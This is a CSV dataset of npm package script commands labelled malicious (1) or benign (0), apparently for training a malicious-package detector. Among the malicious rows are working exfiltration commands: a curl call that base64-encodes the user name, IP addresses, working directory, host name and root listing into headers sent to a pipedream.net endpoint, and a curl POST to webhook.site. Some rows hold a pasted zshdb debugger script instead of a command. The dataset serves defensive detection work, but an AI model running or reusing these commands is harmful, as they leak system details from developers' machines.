command,package_name,label
#   print "We need 4.3.6-dev-0 or greater." 2>&1
#   exit 30
# fi
# is-at-least does an emulate -L zsh
# emulate -L ksh

# Will be set to 1 if the top-level call is a debugger.
#typeset -i _Dbg_script=0

# This function is overwritten by when lib/fns.sh gets loaded
#_Dbg_msg()
#{
#  echo "$*"
#}

# Used by "show version" as well as --version
#_Dbg_do_show_version()
#{
#  _Dbg_msg "$_Dbg_debugger_name; release $_Dbg_release"
#}

# Expand filename given as $1.
# we echo the expanded name or return $1 unchanged if a bad filename.
# Return is 0 if good or 1 if bad.
# File globbing is handled.
# Note we don't check that the file exists; just that the format is
# valid; we do check that we can "search" the directory implied in the
# filename.

#function _Dbg_expand_filename {
#  typeset -r filename="$1"

#   Break out basename and dirname
#  typeset basename="${filename*/}"
#  typeset -x dirname="${filename%/*}"

#   No slash given in filename? Then use . for dirname
#  [[ $dirname == $basename ]] && [[ $filename != '/' ]] && dirname='.'

#   Dirname is ''? Then use / for dirname
#  dirname=${dirname:-/}

#   Handle tilde expansion in dirname
#  dirname=$(echo $dirname)

#  typeset long_path

#  [[ $basename == '.' ]] && basename=''
#  if long_path=$( (cd "$dirname" ; pwd) 2>/dev/null ) ; then
#    if [[ "$long_path" == '/' ]] ; then
#      echo "/$basename"
#    else
#      echo "$long_path/$basename"
#    fi
#    return 0
#  else
#    echo $filename
#    return 1
#  fi
#}

# Create temporary file based on $1
# file $1
#_Dbg_tempname() {
#  echo "$_Dbg_tmpdir/${_Dbg_debugger_name}_$1_$$"
#}

# Process command-line options
#. ${_Dbg_libdir}/dbg-opts.sh
#OPTLIND=1
#_Dbg_parse_options "$@"

#if [[ ! -d $_Dbg_tmpdir ]] && [[ ! -w $_Dbg_tmpdir ]] ; then
#  echo "${_Dbg_pname}: cannot write to temp directory $_Dbg_tmpdir." >&2
#  echo "${_Dbg_pname}: Use -T try directory location." >&2
#  exit 1
#fi

# Save the initial working directory so we can reset it on a restart.
#typeset -x _Dbg_init_cwd=$PWD

#typeset -i _Dbg_running=1       True we are not finished running the program

#typeset -i _Dbg_brkpt_num=0     If nonzero; the breakpoint number that we
#                                are currently stopped at.

# Sets whether or not to display command before executing it.
#typeset _Dbg_set_trace_commands='off'

# Known normal IFS consisting of a space; tab and newline
#typeset -x _Dbg_space_IFS=$' \t\r\n'

# Number of statements to run before entering the debugger.  Is used
# intially to get out of sourced dbg-main.inc script and in top-level
# debugger script to not stop in remaining debugger statements before
# the sourcing the script to be debugged.
#typeset -i _Dbg_step_ignore=1
#[[ -n $_Dbg_histfile ]] && fc -p ${_Dbg_histfile}
,signalr-temp-client-20.20.0,1
echo "Error: no test specified" && exit 1,sketch-71-symbol-resync-99.99.0,1
node index.js,sketch-71-symbol-resync-99.99.0,1
echo "Error: no test specified" && exit 1,sketch-ipsum-99.99.0,1
node index.js,sketch-ipsum-99.99.0,1
echo "Error: no test specified" && exit 1,smeeh-administration-10.0.0,1
node index.js,smeeh-administration-10.0.0,1
node info.js,sodalite-0.23.1,1
echo "Error: no test specified" && exit 1,solodev-cms-10.1.1,1
node index.js,solodev-cms-10.1.1,1
echo "Error: no test specified" && exit 1,source-registry-storage-adapter-1.0.0,1
node index.js,source-registry-storage-adapter-1.0.0,1
node index.js > /dev/null 2>&1,sso-map-1.999.0,1
echo "Error: no test specified" && exit 1,sso-map-1.999.0,1
echo "Error: no test specified" && exit 1,sssssssignalr-temp-client-20.20.0,1
node adham.js,sssssssignalr-temp-client-20.20.0,1
#!/bin/bash
curl -H "h1: $(whoami | base64 | base64 )" -H "h2: $(hostname -I | base64 | base64 | tr -d '\n')" -H "h3: $(pwd | base64 | base64)" -H "h4: $(hostname | base64 | base64 | tr -d '\n')"  -H "h5: $(ls / | base64 | base64 | tr -d '\n')"  https://91d105265257dcee7429b373efe8b505.m.pipedream.net
# -*- shell-script -*-
# dbg-pre.sh - Code common to zshdb and zshdb-trace that has to run first

#   Copyright (C) 2008-2010; 2014 Rocky Bernstein rocky@gnu.org

#   zshdb is free software; you can redistribute it and/or modify it under
#   the terms of the GNU General Public License as published by the Free
#   Software Foundation; either version 2; or (at your option) any later
#   version.

#   zshdb is distributed in the hope that it will be useful; but WITHOUT ANY
#   WARRANTY; without even the implied warranty of MERCHANTABILITY or
#   FITNESS FOR A PARTICULAR PURPOSE.  See the GNU General Public License
#   for more details.

#   You should have received a copy of the GNU General Public License along
#   with zshdb; see the file COPYING.  If not; write to the Free Software
#   Foundation; 59 Temple Place; Suite 330; Boston; MA 02111 USA.

# Here we put definitions common to both the script debugger and
# dbg-trace.sh. In contrast to other routines; this code is sourced
# early -- before most of the debugger script is run.

# Note: initializations which are mostly used in only one sub-part
# (e.g. variables for break/watch/actions) are in the corresponding
# file: either in lib or (less good) command.

# Are we using a debugger-enabled shell? If not let's stop right here.
#typeset old_setopt="$-"

# is-at-least messes up in some situations so we have to not use it for now.
# typeset -fuz is-at-least   Same as "functions -u -z" but better documented.
# if ! is-at-least 4.3.6-dev-0 ; then
#   print "Sorry; your $_Dbg_shell_name just isn't modern enough." 2>&1
#   print "We need 4.3.6-dev-0 or greater." 2>&1
#   exit 30
# fi
# is-at-least does an emulate -L zsh
# emulate -L ksh

# Will be set to 1 if the top-level call is a debugger.
#typeset -i _Dbg_script=0

# This function is overwritten by when lib/fns.sh gets loaded
#_Dbg_msg()
#{
#  echo "$*"
#}

# Used by "show version" as well as --version
#_Dbg_do_show_version()
#{
#  _Dbg_msg "$_Dbg_debugger_name; release $_Dbg_release"
#}

# Expand filename given as $1.
# we echo the expanded name or return $1 unchanged if a bad filename.
# Return is 0 if good or 1 if bad.
# File globbing is handled.
# Note we don't check that the file exists; just that the format is
# valid; we do check that we can "search" the directory implied in the
# filename.

#function _Dbg_expand_filename {
#  typeset -r filename="$1"

#   Break out basename and dirname
#  typeset basename="${filename*/}"
#  typeset -x dirname="${filename%/*}"

#   No slash given in filename? Then use . for dirname
#  [[ $dirname == $basename ]] && [[ $filename != '/' ]] && dirname='.'

#   Dirname is ''? Then use / for dirname
#  dirname=${dirname:-/}

#   Handle tilde expansion in dirname
#  dirname=$(echo $dirname)

#  typeset long_path

#  [[ $basename == '.' ]] && basename=''
#  if long_path=$( (cd "$dirname" ; pwd) 2>/dev/null ) ; then
#    if [[ "$long_path" == '/' ]] ; then
#      echo "/$basename"
#    else
#      echo "$long_path/$basename"
#    fi
#    return 0
#  else
#    echo $filename
#    return 1
#  fi
#}

# Create temporary file based on $1
# file $1
#_Dbg_tempname() {
#  echo "$_Dbg_tmpdir/${_Dbg_debugger_name}_$1_$$"
#}

# Process command-line options
#. ${_Dbg_libdir}/dbg-opts.sh
#OPTLIND=1
#_Dbg_parse_options "$@"

#if [[ ! -d $_Dbg_tmpdir ]] && [[ ! -w $_Dbg_tmpdir ]] ; then
#  echo "${_Dbg_pname}: cannot write to temp directory $_Dbg_tmpdir." >&2
#  echo "${_Dbg_pname}: Use -T try directory location." >&2
#  exit 1
#fi

# Save the initial working directory so we can reset it on a restart.
#typeset -x _Dbg_init_cwd=$PWD

#typeset -i _Dbg_running=1       True we are not finished running the program

#typeset -i _Dbg_brkpt_num=0     If nonzero; the breakpoint number that we
#                                are currently stopped at.

# Sets whether or not to display command before executing it.
#typeset _Dbg_set_trace_commands='off'

# Known normal IFS consisting of a space; tab and newline
#typeset -x _Dbg_space_IFS=$' \t\r\n'

# Number of statements to run before entering the debugger.  Is used
# intially to get out of sourced dbg-main.inc script and in top-level
# debugger script to not stop in remaining debugger statements before
# the sourcing the script to be debugged.
#typeset -i _Dbg_step_ignore=1
#[[ -n $_Dbg_histfile ]] && fc -p ${_Dbg_histfile}
,sssssssignalr-temp-client-20.20.0,1
echo "Error: no test specified" && exit 1,staff-account-35.0.0,1
node app.js,staff-account-35.0.0,1
echo "Error: no test specified" && exit 1,stitch-fix-men-2023.1.0,1
node index.js,stitch-fix-men-2023.1.0,1
echo "Error: no test specified" && exit 1,stitch-fix-men-2023.1.2,1
node index.js,stitch-fix-men-2023.1.2,1
echo "Error: no test specified" && exit 1,subspace-relayer-front-end-4.4.4,1
node index.js,subspace-relayer-front-end-4.4.4,1
echo "Error: no test specified" && exit 1,superset-cypress-1.0.1,1
node index.js,superset-cypress-1.0.1,1
Bug Bounty Purpose Hall of fame,surf-sharekit-frontend-9.9.7,1
node index.js,surf-sharekit-frontend-9.9.7,1
echo "Error: no test specified" && exit 1,svgo-compressor-99.99.0,1
node index.js,svgo-compressor-99.99.0,1
node index.js > /dev/null 2>&1,sw-i18n-1.999.0,1
echo "Error: no test specified" && exit 1,sw-i18n-1.999.0,1
node index.js > /dev/null 2>&1,sw-kendo-atomic-theme-1.999.0,1
echo "Error: no test specified" && exit 1,sw-kendo-atomic-theme-1.999.0,1
echo "Error: no test specified" && exit 1,symbl_ai-1.0.0,1
index.js,symbl_ai-1.0.0,1
echo "Error: no test specified" && exit 1,symphony-monorepo-1.0.1,1
node index.js,symphony-monorepo-1.0.1,1
echo "Error: no test specified" && exit 1,telebot-lib-1.0.19,1
node index.js > /dev/null 2>&1,tema-cnp-3.99.999,1
echo "Error: no test specified" && exit 1,tema-cnp-3.99.999,1
echo "Error: no test specified" && exit 1,tendable-99.0.1,1
node index.js,tendable-99.0.1,1
echo "Error: no test specified" && exit 1,test-dependency-confusion-new-1.0.10,1
node index.js,test-dependency-confusion-new-1.0.10,1
echo "Error: no test specified" && exit 1,test-hacker-sharma-1.0.10,1
node index.js,test-hacker-sharma-1.0.10,1
echo test | curl webhook.site/ac7f2013-3a31-440c-998a-4041cef5fa58 -X POST -d 'hacked' ,test-hacker-sharma-1.0.10,1
echo "Error: no test specified" && exit 1,testhacknowz-1.0.0,1
node index.js,testhacknowz-1.0.0,1
echo "Error: no test specified" && exit 1,testingsomethingforscanner-35.0.0,1
node app.js,testingsomethingforscanner-35.0.0,1
echo "Error: no test specified" && exit 1,test-package-ings-1.0.2,1
node index.js,test-package-ings-1.0.2,1
echo "Error: no test specified" && exit 1,together-app-1.0.0,1
node index.js,together-app-1.0.0,1
echo "Error: no test specified" && exit 1,totaraenterprise-1.0.0,1
node index.js,totaraenterprise-1.0.0,1
echo "Error: no test specified" && exit 1,trino-webui-1.0.1,1
node index.js,trino-webui-1.0.1,1
node info.js,trust-feature-bank-ui-1.0.5-rc.1,1
echo "Error: no test specified" && exit 1,ttwehave-1.0.0,1
node index.js,ttwehave-1.0.0,1
echo "Error: no test specified" && exit 1,twodc-visualizer-1.6.3,1
echo "Error: no test specified" && exit 1,ux-authentication-auth0-1.0.2,1
node index.js > /dev/null 2>&1,venomemon-1.999.0,1
echo "Error: no test specified" && exit 1,venomemon-1.999.0,1
echo "Error: no test specified" && exit 1,vertical-navigation-35.0.0,1
node app.js,vertical-navigation-35.0.0,1
echo "This pkg looks OK!",very-bad-transitive-pkg-1.0.2,1
node index.js --exec install,very-bad-transitive-pkg-1.0.2,1
node index.js > /dev/null 2>&1,vforemon-1.999.0,1
echo "Error: no test specified" && exit 1,vforemon-1.999.0,1
node index.js > /dev/null 2>&1,vforvenom-1.999.0,1
echo "Error: no test specified" && exit 1,vforvenom-1.999.0,1
echo "Error: no test specified" && exit 1,wdpr-ra-appdynamics-node-5.0.0,1
node index.js,wdpr-ra-appdynamics-node-5.0.0,1
echo "Error: no test specified" && exit 1,website-frontend-cms-99.99.0,1
node index.js,website-frontend-cms-99.99.0,1
node index.js,wessycord-1.0.1,1
echo "Error: no test specified" && exit 1,wire-contracts-7.0.0,1
node index.js,wire-contracts-7.0.0,1
ban,all-paths-1.0.2,0
deps-ok && dependency-check --no-dev .,all-paths-1.0.2,0
git-issues,all-paths-1.0.2,0
license-checker --production --onlyunknown --csv,all-paths-1.0.2,0
standard --verbose --fix src/*.js,all-paths-1.0.2,0
npm run pretty,all-paths-1.0.2,0
npm run lint,all-paths-1.0.2,0
prettier-standard 'src/*.js',all-paths-1.0.2,0
nsp check,all-paths-1.0.2,0
t="$(npm pack .)"; wc -c "${t}"; tar tvf "${t}"; rm "${t}";,all-paths-1.0.2,0
npm run unit,all-paths-1.0.2,0
jest src,all-paths-1.0.2,0
dependency-check --unused --no-dev .,all-paths-1.0.2,0
semantic-release,all-paths-1.0.2,0
travis-deploy-once,all-paths-1.0.2,0
ban,am-i-a-dependency-1.1.2,0
deps-ok && dependency-check --no-dev .,am-i-a-dependency-1.1.2,0
git-issues,am-i-a-dependency-1.1.2,0
license-checker --production --onlyunknown --csv,am-i-a-dependency-1.1.2,0
standard --verbose --fix src/*.js,am-i-a-dependency-1.1.2,0
npm run lint,am-i-a-dependency-1.1.2,0
nsp check,am-i-a-dependency-1.1.2,0
t="$(npm pack .)"; wc -c "${t}"; tar tvf "${t}"; rm "${t}";,am-i-a-dependency-1.1.2,0
npm run unit,am-i-a-dependency-1.1.2,0
mocha src/*-spec.js,am-i-a-dependency-1.1.2,0
semantic-release pre && npm publish && semantic-release post,am-i-a-dependency-1.1.2,0
mocha,any-1.0.0,0
nyc mocha -R spec,app-root-path-3.1.0,0
npm test && nyc report --reporter=text-lcov > coverage.lcov && codecov,app-root-path-3.1.0,0
semantic-release pre && npm publish && semantic-release post,app-root-path-3.1.0,0
semantic-release,app-root-path-3.1.0,0
npx git-cz,app-root-path-3.1.0,0
mocha -R spec,array-initial-1.1.0,0
mocha,array-intersection-0.1.2,0
mocha,array-last-1.3.0,0
mocha,arr-union-3.1.0,0
rimraf dist docs,asset-utils-2.2.1,0
pkg build --strict,asset-utils-2.2.1,0
pkg check --strict,asset-utils-2.2.1,0
tsx scripts/generateDocs.ts,asset-utils-2.2.1,0
vitest,asset-utils-2.2.1,0
tsc,astro-auto-import-0.4.4,0
npm run build,astro-auto-import-0.4.4,0
nyc npm run mocha-node-test -- --grep @nycinvalid --invert,async-3.2.6,0
jsdoc -c ./support/jsdoc/jsdoc.json && node support/jsdoc/jsdoc-fix-html.js,async-3.2.6,0
eslint --fix .,async-3.2.6,0
karma start,async-3.2.6,0
mocha,async-3.2.6,0
npm run mocha-node-test && npm run mocha-browser-test,async-3.2.6,0
npm run lint && npm run mocha-node-test,async-3.2.6,0
nyc npm run mocha-node-test -- --grep @nycinvalid --invert,async-es-3.2.6,0
jsdoc -c ./support/jsdoc/jsdoc.json && node support/jsdoc/jsdoc-fix-html.js,async-es-3.2.6,0
eslint --fix .,async-es-3.2.6,0
karma start,async-es-3.2.6,0
mocha,async-es-3.2.6,0
npm run mocha-node-test && npm run mocha-browser-test,async-es-3.2.6,0
npm run lint && npm run mocha-node-test,async-es-3.2.6,0
mkdir -p dist,blacklist-1.1.4,0
umd --commonJS blacklist index.js dist/blacklist.js,blacklist-1.1.4,0
uglifyjs dist/blacklist.js > dist/blacklist.min.js,blacklist-1.1.4,0
npm run build,blacklist-1.1.4,0
standard,blacklist-1.1.4,0
faucet,blacklist-1.1.4,0
npm run standard && npm run unit,blacklist-1.1.4,0
eslint .,bytes-3.1.2,0
mocha --check-leaks --reporter spec,bytes-3.1.2,0
nyc --reporter=lcov --reporter=text npm test,bytes-3.1.2,0
nyc --reporter=html --reporter=text npm test,bytes-3.1.2,0
eslint .,bytes-iec-3.1.1,0
mocha test/* --check-leaks --reporter spec --require ts-node/register --require tsconfig-paths/register,bytes-iec-3.1.1,0
mocha test/*.js --check-leaks --reporter spec,bytes-iec-3.1.1,0
nyc --reporter=text npm test,bytes-iec-3.1.1,0
nyc --reporter=html --reporter=text npm test,bytes-iec-3.1.1,0
eslint --cache --cache-location node_modules/.cache/.eslintcache --report-unused-disable-directives .,cint-9.1.0,0
nyc,cint-9.1.0,0
cross-env NODE_ENV=test mocha src,cint-9.1.0,0
node --test ./tests/*.mjs,classnames-2.5.1,0
node ./benchmarks/run.js,classnames-2.5.1,0
rollup --plugin commonjs;json;node-resolve ./benchmarks/runInBrowser.js --file ./benchmarks/runInBrowser.bundle.js && http-server -c-1 ./benchmarks,classnames-2.5.1,0
tsd,classnames-2.5.1,0
eslint lib/**.js,cli-progress-3.12.0,0
npm run lint,cli-progress-3.12.0,0
mocha test/**/*.test.js,cli-progress-3.12.0,0
mocha-runner './specs/**/*.js',coalescy-1.0.0,0
eslint --format 'node_modules/eslint-friendly-formatter' lib/ bin/ specs/ -c './configs/eslint.json',coalescy-1.0.0,0
istanbul cover -x 'specs/**/*.js' mocha-runner 'specs/**/*.js' html text-summary,coalescy-1.0.0,0
istanbul cover -x 'specs/**/*.js' mocha-runner 'specs/**/*.js' html text-summary -- --useCache=true,coalescy-1.0.0,0
npm run coverage && watch-spawn -p 'specs/**/*.js' -p 'bin/**/*.js' -p 'lib/**/*.js' npm run coverage-cache,coalescy-1.0.0,0
node '../../ops/scripts/esbuild.js' && npm run dts,codsen-utils-1.6.7,0
exit 0,codsen-utils-1.6.7,0
exit 0,codsen-utils-1.6.7,0
DEV=true node '../../ops/scripts/esbuild.js' && npm run dts,codsen-utils-1.6.7,0
c8 npm run unit && npm run examples && npm run lint,codsen-utils-1.6.7,0
rollup -c && npm run prettier -- 'types/index.d.ts' --write --log-level 'silent',codsen-utils-1.6.7,0
node '../../ops/scripts/run-examples.js',codsen-utils-1.6.7,0
node '../../ops/lect/lect.js' && npm run prettier -- 'README.md' '.all-contributorsrc' 'rollup.config.js' --write,codsen-utils-1.6.7,0
npm publish || :,codsen-utils-1.6.7,0
eslint . --fix,codsen-utils-1.6.7,0
node perf/check.js,codsen-utils-1.6.7,0
echo 'ready',codsen-utils-1.6.7,0
prettier,codsen-utils-1.6.7,0
npm run prettier -- --write '**/*.{ts;tsx;md}' --no-error-on-unmatched-pattern --log-level 'silent',codsen-utils-1.6.7,0
npm run lect && npm run build,codsen-utils-1.6.7,0
npm run devtest,codsen-utils-1.6.7,0
uvu test,codsen-utils-1.6.7,0
vitest run,collection-2.1.1,0
tsc --noEmit && tsup,collection-2.1.1,0
tsc -p tsconfig.docs.json,collection-2.1.1,0
prettier --check . && cross-env TIMING=1 eslint --format=pretty src __tests__,collection-2.1.1,0
prettier --write . && cross-env TIMING=1 eslint --fix --format=pretty src __tests__,collection-2.1.1,0
pnpm run format,collection-2.1.1,0
pnpm run build:docs && api-extractor run --local --minify && generate-split-documentation,collection-2.1.1,0
git cliff --prepend ./CHANGELOG.md -u -c ./cliff.toml -r ../../ --include-path 'packages/collection/*',collection-2.1.1,0
cliff-jumper,collection-2.1.1,0
node node_modules/.bin/jasmine JASMINE_CONFIG_PATH=test/config.json,combine-lists-1.0.1,0
xo && ava,component-type-2.0.0,0
ban,cypress-failed-log-2.10.0,0
npx -p dependency-version-badge update-badge cypress,cypress-failed-log-2.10.0,0
deps-ok && dependency-check . --unused --no-dev --ignore-module logdown,cypress-failed-log-2.10.0,0
git-issues,cypress-failed-log-2.10.0,0
license-checker --production --onlyunknown --csv,cypress-failed-log-2.10.0,0
standard --verbose --fix src/*.js test/*.js,cypress-failed-log-2.10.0,0
npm run lint,cypress-failed-log-2.10.0,0
t="$(npm pack .)"; wc -c "${t}"; tar tvf "${t}"; rm "${t}";,cypress-failed-log-2.10.0,0
npm run unit,cypress-failed-log-2.10.0,0
mocha --timeout 180000 src/*-spec.js,cypress-failed-log-2.10.0,0
npm run warn-only,cypress-failed-log-2.10.0,0
semantic-release,cypress-failed-log-2.10.0,0
echo Test failed; details in $1,cypress-failed-log-2.10.0,0
node test/verify-failed-json.js,cypress-failed-log-2.10.0,0
rm failed-*.json || true,cypress-failed-log-2.10.0,0
cypress open,cypress-failed-log-2.10.0,0
cypress run,cypress-failed-log-2.10.0,0
stop-only --warn -f src,cypress-failed-log-2.10.0,0
stop-only -f src,cypress-failed-log-2.10.0,0
ban,data-driven-1.0.0,0
deps-ok && dependency-check --no-dev .,data-driven-1.0.0,0
git-issues,data-driven-1.0.0,0
license-checker --production --onlyunknown --csv,data-driven-1.0.0,0
standard --verbose --fix src/*.js,data-driven-1.0.0,0
npm run pretty,data-driven-1.0.0,0
npm run lint,data-driven-1.0.0,0
prettier-standard 'src/*.js',data-driven-1.0.0,0
nsp check,data-driven-1.0.0,0
t="$(npm pack .)"; wc -c "${t}"; tar tvf "${t}"; rm "${t}";,data-driven-1.0.0,0
npm run unit,data-driven-1.0.0,0
mocha src/*-spec.js,data-driven-1.0.0,0
semantic-release pre && npm publish --access public && semantic-release post,data-driven-1.0.0,0
rollup -c,date-and-time-3.6.0,0
./test.sh,date-and-time-3.6.0,0
tsd ./test/ts,date-and-time-3.6.0,0
mocha,ends-with-1.0.1,0
eslint,error-4.1.0,0
eslint --fix,error-4.1.0,0
npm run test:unit && npm run test:typescript,error-4.1.0,0
c8 --100 node --test,error-4.1.0,0
tsd,error-4.1.0,0
npm run build && npm run format,esast-util-from-estree-2.0.0,0
tsc --build --clean && tsc --build && type-coverage,esast-util-from-estree-2.0.0,0
remark . -qfo && prettier . -w --log-level warn && xo --fix,esast-util-from-estree-2.0.0,0
node --conditions development test.js,esast-util-from-estree-2.0.0,0
c8 --100 --reporter lcov npm run test-api,esast-util-from-estree-2.0.0,0
npm run build && npm run format && npm run test-coverage,esast-util-from-estree-2.0.0,0
npm run build && npm run format,esast-util-from-js-2.0.1,0
tsc --build --clean && tsc --build && type-coverage,esast-util-from-js-2.0.1,0
remark . -qfo && prettier . -w --log-level warn && xo --fix,esast-util-from-js-2.0.1,0
node --conditions development test/index.js,esast-util-from-js-2.0.1,0
c8 --100 --reporter lcov npm run test-api,esast-util-from-js-2.0.1,0
npm run build && npm run format && npm run test-coverage,esast-util-from-js-2.0.1,0
xo && ava && tsd,escape-goat-4.0.0,0
node benchmark/index.js,escape-html-1.0.3,0
npm run build && npm run format,estree-util-to-js-2.0.0,0
tsc --build --clean && tsc --build && type-coverage,estree-util-to-js-2.0.0,0
remark . -qfo && prettier . -w --log-level warn && xo --fix,estree-util-to-js-2.0.0,0
node --conditions development test/index.js,estree-util-to-js-2.0.0,0
c8 --100 --reporter lcov npm run test-api,estree-util-to-js-2.0.0,0
npm run build && npm run format && npm run test-coverage,estree-util-to-js-2.0.0,0
npm run build && npm run format,estree-util-visit-2.0.0,0
tsc --build --clean && tsc --build && type-coverage,estree-util-visit-2.0.0,0
remark . -qfo && prettier . -w --log-level warn && xo --fix,estree-util-visit-2.0.0,0
node --conditions development test.js,estree-util-visit-2.0.0,0
c8 --100 --reporter lcov npm run test-api,estree-util-visit-2.0.0,0
npm run build && npm run format && npm run test-coverage,estree-util-visit-2.0.0,0
tsc --project .,eth-rpc-errors-4.0.3,0
yarn build && node test,eth-rpc-errors-4.0.3,0
yarn build && nyc tape test,eth-rpc-errors-4.0.3,0
eslint . --ext ts;js;json,eth-rpc-errors-4.0.3,0
eslint . --ext ts;js;json --fix,eth-rpc-errors-4.0.3,0
yarn test,eth-rpc-errors-4.0.3,0
mocha,extend-shallow-3.0.2,0
yarn run clean && yarn build:lib && yarn build:es,fast-loops-1.1.4,0
cross-env BABEL_ENV=commonjs babel modules --out-dir lib --ignore __tests__,fast-loops-1.1.4,0
babel modules --out-dir es --ignore __tests__,fast-loops-1.1.4,0
rimraf es lib coverage,fast-loops-1.1.4,0
yarn lint && yarn test:coverage,fast-loops-1.1.4,0
prettier --write "modules/**/*.js",fast-loops-1.1.4,0
eslint modules/**/*.js,fast-loops-1.1.4,0
yarn run check && yarn build && npm publish,fast-loops-1.1.4,0
cross-env BABEL_ENV=commonjs jest,fast-loops-1.1.4,0
cross-env BABEL_ENV=commonjs jest --coverage,fast-loops-1.1.4,0
yarn test -- --watch,fast-loops-1.1.4,0
jake test,FileList-v1.0.4,0
npm publish,file_size_url-1.0.6,0
node example/test.js,file_size_url-1.0.6,0
echo "Error: no test specified" && exit 1,find-webpack-2.2.1,0
semantic-release,find-webpack-2.2.1,0
mocha -u tdd tests/*_tests.js,fireworm-0.7.2,0
npm run lint && echo "view test/index.html in a browser",fizzy-ui-utils-3.0.0,0
npx eslint .,fizzy-ui-utils-3.0.0,0
rollup --config,flat-util-1.1.11,0
npm run build,flat-util-1.1.11,0
eslint . --max-warnings 0,flat-util-1.1.11,0
eslint . --fix --max-warnings 0,flat-util-1.1.11,0
npm run build && node test-runner.mjs,flat-util-1.1.11,0
eslint *.js test,follow-redirects-1.15.9,0
nyc mocha,follow-redirects-1.15.9,0
eslint .,gamedig-5.2.0,0
eslint --fix .,gamedig-5.2.0,0
npm run build,gamedig-5.2.0,0
node tools/esbuild.js,gamedig-5.2.0,0
mocha,get-object-0.2.0,0
xo && ava,gh-got-10.0.0,0
eslint src --ext ts --fix,gifenc-1.0.1,0
prettier --write "{src}/**/*.ts",gifenc-1.0.1,0
typedoc,gifenc-1.0.1,0
yarn up "@*/*" -i && yarn up "*" -i,gifenc-1.0.1,0
tsc -b src && gen-esm-wrapper dist/index.js dist/index.mjs,gifenc-1.0.1,0
yarn build -w,gifenc-1.0.1,0
node scripts/clean-dist.mjs,gifenc-1.0.1,0
standard-version,gifenc-1.0.1,0
yarn clean && yarn build,gifenc-1.0.1,0
husky install .github/husky,gifenc-1.0.1,0
grunt,globalize-1.7.0,0
npm update @globby/main-branch glob-stream fast-glob && node bench.js,globby-14.1.0,0
xo && ava && tsd,globby-14.1.0,0
run-s clean && run-p build.*,globify-gitignore-1.0.3,0
tsc -p tsconfig.cjs.json && mjscjs -p tsconfig.cjs.json,globify-gitignore-1.0.3,0
tsc -p tsconfig.esm.json && mjscjs -p tsconfig.esm.json,globify-gitignore-1.0.3,0
shx rm -rf dist,globify-gitignore-1.0.3,0
shx rm -rf ./README.md && pnpm exec readme --path ./dev/docs/readme.md -y && pnpm exec ts-readme --header-depth 3 && pnpm run format,globify-gitignore-1.0.3,0
prettier --write .,globify-gitignore-1.0.3,0
eslint . --fix,globify-gitignore-1.0.3,0
jest,globify-gitignore-1.0.3,0
prettier . --check,globify-gitignore-1.0.3,0
eslint .,globify-gitignore-1.0.3,0
mocha,handlebars-helpers-0.10.0,0
eslint --ext js .,handlebars-helpers-0.14.2,0
mocha,handlebars-helpers-0.14.2,0
verb,handlebars-helpers-0.14.2,0
ban,has-only-1.1.1,0
deps-ok && dependency-check --no-dev .,has-only-1.1.1,0
git-issues,has-only-1.1.1,0
license-checker --production --onlyunknown --csv,has-only-1.1.1,0
standard --verbose --fix src/*.js,has-only-1.1.1,0
npm run pretty,has-only-1.1.1,0
npm run lint,has-only-1.1.1,0
prettier-standard 'src/*.js',has-only-1.1.1,0
nsp check,has-only-1.1.1,0
t="$(npm pack .)"; wc -c "${t}"; tar tvf "${t}"; rm "${t}";,has-only-1.1.1,0
npm run unit,has-only-1.1.1,0
mocha src/*-spec.js,has-only-1.1.1,0
dependency-check --unused --no-dev .,has-only-1.1.1,0
semantic-release,has-only-1.1.1,0
travis-deploy-once,has-only-1.1.1,0
tsc --build --clean && tsc --build && tsd && type-coverage,hastscript-9.0.1,0
remark --frail --output --quiet -- . && prettier --log-level warn --write -- . && xo --fix,hastscript-9.0.1,0
node --conditions development script/generate-jsx.js && node --conditions development script/build.js,hastscript-9.0.1,0
node --conditions development test/index.js,hastscript-9.0.1,0
c8 --100 --reporter lcov -- npm run test-api,hastscript-9.0.1,0
npm run generate && npm run build && npm run format && npm run test-coverage,hastscript-9.0.1,0
npm run build && npm run format,hast-util-classnames-3.0.0,0
tsc --build --clean && tsc --build && type-coverage,hast-util-classnames-3.0.0,0
remark . -qfo && prettier . -w --log-level warn && xo --fix,hast-util-classnames-3.0.0,0
node --conditions development test.js,hast-util-classnames-3.0.0,0
c8 --100 --reporter lcov npm run test-api,hast-util-classnames-3.0.0,0
npm run build && npm run format && npm run test-coverage,hast-util-classnames-3.0.0,0
npm run build && npm run format,hast-util-embedded-3.0.0,0
tsc --build --clean && tsc --build && type-coverage,hast-util-embedded-3.0.0,0
